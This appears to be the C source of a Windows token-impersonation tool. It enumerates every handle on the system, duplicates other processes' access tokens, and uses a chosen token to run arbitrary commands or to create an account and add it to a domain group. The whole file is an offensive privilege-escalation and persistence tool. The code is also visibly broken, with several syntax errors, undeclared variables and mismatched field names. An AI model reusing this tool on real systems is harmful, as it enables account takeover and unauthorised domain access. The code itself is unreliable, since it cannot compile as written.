/*
 * Author: Arthur (RTHXR)
 * 27/02/2024
 */

#include<stdio.h>
#include<windows.h>
#include<winternl.h>
#include<lm.h>
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ntdll")

#define MAX_USERNAME_LENGHT 256
#define MAX_DOMAINNAME_LENGHT 256
#define FULL_NAME_LENGHT 271
#define TOKEN_TYPE_LENGHT 30
#define COMMAND_LENGHT 1000
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGHT_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW ((NTSTATUS)0x80000005L)
#define SystemHandleInformation 16
#define SystemHandleInformationize 1024 * 1024 * 10

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG Inis_token_validAttributes;
    
    GENERIC_MAPPING GenericMapping;
    ULONG is_token_validAccess;

    BOOLEAN SecutiryRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;

    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT ProcessId;
    USHORT CreaterBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION 
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE
{
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PahedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING *POBJECT_NAME_INFORMATION;

typedef struct
{
    HANDLE token_handle;
    int token_id;
    wchar_t owner_name[FULL_NAME_LENGHT];
    wchar_t user_name[FULL_NAME_LENGHT];
    wchar_t TokenType[100];
    wchar_t TokenImpersonationLevel[100];
} TOKEN;

using fNtQuerySystemInformation = NTSTATUS(WINAPI *)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLenght,
    PULONG ReturnLenght
);

void usage()
{
    printf("Usage: \n");
    printf("\t- Impersonating users and running commands: rthxr.exe exec <User TokenId> <Command>\n\n");
    exit(0);
}

void get_token_owner_info(TOKEN *TOKEN_INFO)
{
    wchar_t username[MAX_USERNAME_LENGHT];
    wchar_t domain[MAX_DOMAINNAME_LENGHT];
    wchar_t full_name[FULL_NAME_LENGHT];
    SID_NAME_USE sid;
    DWORD user_lenght = sizeof(username), domain_lenght = sizeof(domain), token_info;
    if(!GetTokenInformation(TOKEN_INFO->token_handle, TokenOwner, NULL, 0, &token_info))
    {
        PTOKEN_OWNER TokenStatisticsInformation = (PTOKEN_OWNER)GlobalAlloc(GPTR, token_info);
        if(GetTokenInformation(TOKEN_INFO->token_handle, TokenOwner, TokenStatisticsInformation, token_info, &token_info))
        {
            LookupAccountSidW(NULL, ((TOKEN_OWNER *)TokenStatisticsInformation)->Owner, username, &user_lenght, domain. &domain_lenght, &sid);
            _snwprintf_s(full_name, FULL_NAME_LENGHT, L"%ws/%ws", domain, username);
            wcscpy_s(TOKEN_INFO->owner_name, TOKEN_TYPE_LENGHT, full_name);
        }
    }
}

void get_token_user_info(TOKEN *TOKEN_INFO)
{
    wchar_t username[MAX_USERNAME_LENGHT];
    wchar_t domain[MAX_DOMAINNAME_LENGHT];
    wchar_t full_name[FULL_NAME_LENGHT];
    SID_NAME_USE sid;
    DWORD user_lenght = sizeof(username), domain_lenght = sizeof(domain), token_info;

    if(!GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, NULL, 0, &token_info))
    {
        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
        if(GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, TokenStatisticsInformation, token_info, &token_info)) 
        {
            LookupAccountSidW(NULL, ((TOKEN_USER *)TokenStatisticsInformation)->User.Sid, username, &user_lenght, domain, &domain_lenght, &sid);
            _snwprintf_s(full_name, FULL_NAME_LENGHT, L"%ws/%ws", domain, username);
            wcscpy_s(TOKEN_INFO->user_name, TOKEN_TYPE_LENGHT, full_name);
        }
    }
}

void get_token_security_context(TOKEN *TOKEN_INFO)
{
    DWORD returned_tokimp_lenght;
    if(!GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_lenght))
    {
        PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_lenght);
        if(GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_lenght, &returned_tokimp_lenght))
        {
            if(*((SECURITY_IMPERSONATION_LEVEL *)TokenImpersonationInformation) == SecurityImpersonation)
            { wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGHT, L"SecurityImpersonation"); }
            
            else if (*((SECURITY_IMPERSONATION_LEVEL *)TokenImpersonationInformation) == SecurityDelegation)
            { wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGHT, L"SecurityDelegation"); }
            
            else if (*((SECURITY_IMPERSONATION_LEVEL *)TokenImpersonationInformation) == SecurityAnonymous)
            { wcscpy_s(TOKEN_INFO->TokenImpersonationInformation, TOKEN_TYPE_LENGHT, L"SecurityAnonymous"); }
            
            else if (*((SECURITY_IMPERSONATION_LEVEL *)TokenImpersonationInformation) == SecurityIdentification)
            { wcscpy_s(TOKEN_INFO->TokenImpersonationInformation, TOKEN_TYPE_LENGHT, L"SecurityIdentification"); }
        }
    }
}

void get_token_information(TOKEN *TOKEN_INFO)
{
    DWORD returned_tokinfo_lenght;
    if(!GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, NULL, 0, &returned_tokinfo_lenght))
    {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_lenght);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_lenght, &returned_tokinfo_lenght))
        {
            if(TokenStatisticsInformation->TokenType == TokenPrimary)
            { wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGHT, L"TokenPrimary"); }

            else if(TokenStatisticsInformation->TokenType == TokenImpersonation)
            { wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGHT, L"TokenImpersonation"); }
        }
    }
}

LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass)
{
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dsize);
    if((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGHT_MISMATCH))
    {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL))
    {
        data = (LPWSTR)calloc(pObjectInfo->Lenght, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Lenght);
    }

    free(pObjectInfo);
    return data;
}

int wmain(int argc, wchar_t *argv[])
{
    HANDLE hToken;
    DWORD cbSize;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    OpenProcessToken(hprocess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);

    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);

    DWORD integrity_level = (DWORD) *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

    if(integrity_level < SECURITY_MANDATORY_HIGH_RID)
    {
        printf("Low privilege error!!1!\n");
        return 1
    }

    TOKEN_PRIVILEGES tp;
    LUID luidSeAssignPrimaryTokenPrivilege;
    printf("+ Enabling SeAssignPrimaryToken\n");
    
    if(LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luidSeAssignPrimaryTokenPrivilege) == 0)
    { printf("\t- SeAssignPrimaryToken not owned\n"); }

    else
    { printf("\t+ SeAssignPrimaryToken owned!1!!"); }

    tp.privilegeCount = 1;
    tp.Privileges[0].Luid = luidSeAssignPrimaryTokenPrivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if(AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0)
    { printf("\t- SeAssignPrimaryToken adjust token failed: %d\n", GetLastError()); }

    else 
    { printf("\t+ SeAssignPrimaryToken enabled!1!!\n"); }

    LUID luidSeDebugPrivilege;
    printf("+ Enabling SeDebugPrivilege\n");
    if(LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivilege) == 0)
    { printf("\t- SeDebugPrivilege not owned!1!!\n"); }
    
    else
    { printf("\t+ SeDebugPrivilege owned!1!!\n"); }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luidSeDebugPrivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0)
    { printf("\t- SeDebugPrivilege adjust token failed: %d\n", GetLastError()); }
    else
    { printf("\t+ SeDebugPrivilege enabled!1!!\n"); }

    CloseHandle(hProcess);
    CloseHandle(hToken);

    ULONG ReturnLenght = 0;
    TOKEN found_tokens[100];
    int nbrsfoundtokens = 0;

    fNtQuerySystemInformation fNtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationize, &returnLenght);

    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

        HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if(process == INVALID_HANDLE_VALUE)
        {
            CloseHandle(process);
            continue;
        }

        HANDLE dupHandle;
        if(DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0)
        {
            CloseHandle(process);
            continue;
        }

        POBJECT_NAME_INFORMATION objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(8192);
        if(wcscmp(GetObjectInfo(dupHandle, ObjectTypeInformation), L"Token"))
        {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        TOKEN TOKEN_INFO;
        TOKEN_INFO.token_handle = dupHandle;
        get_token_owner_info(&TOKEN_INFO);
        get_token_user_info(&TOKEN_INFO);
        get_token_information(&TOKEN_INFO);

        if(wcscmp(TOKEN_INFO.TokenType, L"TokenPrimary") != 0)
        {
            get_token_security_context(&TOKEN_INFO);
        } else {
            wcscpy_s(TOKEN_INFO.TokenImpersonationLevel, TOKEN_TYPE_LENGHT, L" ");
        }

        int is_new_token = 0;
        for (int j = 0; j <= nbrsfoundtokens; j++)
        {
            if(wcscmp(found_tokens[j].user_name, TOKEN_INFO.user_name) == 0 && wcscmp(found_tokens[j].TokenType, TOKEN_INFO,TokenType) == 0 && wcscmp(found_tokens[j].TokenImpersonationLevel, TOKEN_INFO.TokenImpersonationLevel) == 0)
            {
                is_new_token = 1;
            }
        }
        if(is_new_token == 0)
        {
            TOKEN_INFO.token_id = nbrsfoundtokens;
            found_tokens[nbrsfoundtokens] = TOKEN_INFO;
            nbrsfoundtokens += 1;
        }

    CloseHandle(process);    
    
    }

    if(wcscmp(argv[1], L"list") == 0)
    {
        printf("\n+ Listing available tokens\n");
        for (int k = 0; k < nbrsfoundtokens; k++)
        {
            printf("[ID: %d][SESSION: %d][%ws][%ws] User: %ws\n", found_tokens[k].token_id, found_tokens[k].token_session_id, found_tokens[k].TokenType, found_tokens[k].TokenImpersonationLevel, found_tokens[k].user_name);
            
        }
    }

    else if((wcscmp(argv[1]), L"adduser") == 0 && argc == 7 || (wcscmp(argv[1], L"exec") == 0 && argc == 4))
    {
        int selected_token = _wtoi(argv[2]);
        for (int k = 0; k < nbrsfoundtokens; k++)
        {
            if(found_tokens[k].token_id == selected_token)
            {
                HANDLE duplicated_token;
                if(DuplicateTokenEx(found_tokens[k].token_handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token) != 0)
                {
                    if(wcscmp(argv[1], L"adduser") == 0)
                    {
                        printf("\t+ Impersonating %ws\n", found_tokens[k].user_name);
                        if(ImpersonateLoggedOnUser(duplicated_token) == 0)
                        {
                            printf("\t-Impersonation failed with error: %d\n", GetLastError());
                            return 1;
                        }

                        wchar_t *group = argv[5];
                        wchar_t *server = argv[6];
                        USER_INFO_1 ui;
                        LOCALGROUP_MEMBERS_INFO_3 account;
                        memset(&ui, 0, sizeof(ui));
                        memset(&account, 0, sizeof(account));
                        ui.usri1_name = argv[3];
                        ui.usri1_password = argv[4];
                        ui.usri1_priv = USER_PRIV_USER;
                        ui.usri1_home_dir = NULL;
                        ui.usri1_comment = NULL;
                        ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
                        ui.usri1_script_path = NULL;

                        printf("\t+ Adding user %ls on %ls\n", ui.usri1_name, server);
                        if(NetUserAdd(server, 1, (LPBYTE)&ui, NULL) !+ NERR_Success)
                        {
                            printf("\t- Add user failed with error: %d\n", GetLastError());
                            return 1;
                        }

                        printf("\t+ Adding user %ws to domain group %ws\n", ui.usri1_name, group);
                        if(NetGroupAddUser(server, group, ui.usri1_name) != 0)
                        {
                            printf("\t- Add user in domain %ws failed with error: %d\n", server, GetLastError());
                            return 1;
                        }
                        RevertToSelf();
                    }

                    if(wcscmp(argv[1], L"exec") == 0)
                    {
                        STARTUPINFO si = {};
                        PROCESS_INFORMATION pi = {};
                        wchar_t command[COMMAND_LENGHT];
                        _snwprintf_s(command, COMMAND_LENGHT, L"cmd.exe /c %ws", argv[3]);
                        if (integrity_level >= SECURITY_MANDATORY_SYSTEM_RID)
                        {
                            if(!SetTokenInformation(duplicated_token, TokenSessionId, &current_token_session_id, sizeof(DWORD)))
                            {
                                printf("\t- Couldnt change token session id w/ error: %d\n", GetLastError());
                            }

                            printf("\t+ Impersonating %ws and lauching command [%ws] via CreateProcessWithTokenW\n", found_tokens[k].user_name, command);
                            CreateProcessAsUserW(duplicated_token, NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
                            Sleep(2000);
                        }

                        if(integrity_level >= SECURITY_MANDATORY_HIGH_RID && integrity_level < SECURITY_MANDATORY_SYSTEM_RID)
                        {
                            printf("\t+ Impersonating %ws and lauching command [%ws] via CreateProcessWithTokenW\n", found_tokens[k].user_name, command);
                            CreateProcessWithTokenW(duplicated_token, 0, NULL, command, 0, 0, 0, &si, &pi);
                        }
                    }

                    CloseHandle(duplicated_token);
                } else {
                    printf("- Duplication failed with error: %d\n", GetLastError());
                    return 1;
                }
            }
        }
    } else {
        usage();
    }

    return 0;
}
